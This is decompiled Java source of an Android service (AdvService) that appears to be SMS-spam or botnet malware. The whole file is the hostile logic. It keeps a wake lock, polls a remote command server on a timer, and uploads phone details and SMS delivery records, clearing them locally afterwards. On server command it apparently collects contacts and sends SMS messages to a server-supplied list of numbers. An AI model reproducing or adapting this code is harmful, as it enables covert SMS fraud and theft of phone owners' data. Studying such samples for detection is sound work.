// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.admv.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import com.admv2.baseutil.BasePhoneUtil;
import com.admv2.baseutil.PollUnit;
import com.admv2.db.*;
import com.admv2.net.DataSend;
import com.ejaob2.actionjob.AdvAction;
import com.ejaob2.actionjob.ContentAction;
import com.luebad.advdatamodule.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class AdvService extends Service
{

    public AdvService()
    {
        m_nexttime = 300;
    }

    private boolean CommandProcess(byte abyte0[])
    {
        ReplayStruct replaystruct = DataCover.BytesToReplay(abyte0);
        if(m_nexttime > 3600)
            m_nexttime = 1800;
        if(replaystruct.data_head.reconn_deply != m_nexttime && replaystruct.data_head.reconn_deply != 0)
        {
            m_nexttime = replaystruct.data_head.reconn_deply;
            PollUnit.SetPoll(m_nexttime, m_nexttime, "");
        }
        if(replaystruct.data_head.tontactStatus == 1)
            ContentAction.ContentsAction(m_context);
        if(replaystruct.data_head.sms_task_rec_phone_count > 0)
        {
            (new AdvAction(m_context)).Action(true, replaystruct.data_context, replaystruct.rec_phone_list, replaystruct.data_head.sms_task_id);
            return true;
        } else
        {
            return false;
        }
    }

    private byte[] SendRegHeart()
    {
        RequestStruct requeststruct = new RequestStruct();
        if(!BasePhoneUtil.GetPhoneInfo(m_context, requeststruct))
            return null;
        lock.lock();
        DBSent dbsent = new DBSent(m_context);
        DBDelivery dbdelivery = new DBDelivery(m_context);
        requeststruct.data_head.sms_rec_phone_count = dbsent.getSent(requeststruct.rec_phone_list);
        requeststruct.data_head.sms_rec_phone_decount = dbdelivery.getDelivery(requeststruct.rec_phone_delist);
        byte abyte0[] = DataSend.send_reg(requeststruct);
        if(abyte0 != null)
        {
            dbsent.clearSent(requeststruct.rec_phone_list);
            dbdelivery.clearDelivery(requeststruct.rec_phone_delist);
        }
        lock.unlock();
        return abyte0;
    }

    private void acquireWakeLock()
    {
        if(m_wakeLock == null)
        {
            m_wakeLock = ((PowerManager)getSystemService("power")).newWakeLock(0x20000001, "PostLocationService");
            if(m_wakeLock != null)
                m_wakeLock.acquire();
        }
    }

    private void releaseWakeLock()
    {
        if(m_wakeLock != null)
        {
            m_wakeLock.release();
            if(true)
                m_wakeLock = null;
        }
    }

    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public void onCreate()
    {
        super.onCreate();
        m_context = this;
        m_nexttime = (new DBConfig(m_context)).GetDeplay();
        PollUnit.SetPoll(m_nexttime, m_nexttime, "");
    }

    public int onStartCommand(Intent intent, int i, int j)
    {
        (new Thread() {

            public void run()
            {
                acquireWakeLock();
                PollUnit.StopPoll(m_context, com/admv/service/AdvService);
                (new DBSlient(m_context)).ClearDaySelient();
                BasePhoneUtil.PhoneStatusCheck(m_context);
                byte abyte0[];
                do
                    abyte0 = SendRegHeart();
                while(abyte0 != null && CommandProcess(abyte0));
                PollUnit.StartPoll(m_context, com/admv/service/AdvService);
                releaseWakeLock();
            }

            final AdvService this$0;

            
            {
                this$0 = AdvService.this;
                super();
            }
        }).start();
        return 3;
    }

    private static Lock lock = new ReentrantLock();
    private static android.os.PowerManager.WakeLock m_wakeLock = null;
    private Context m_context;
    private int m_nexttime;






}
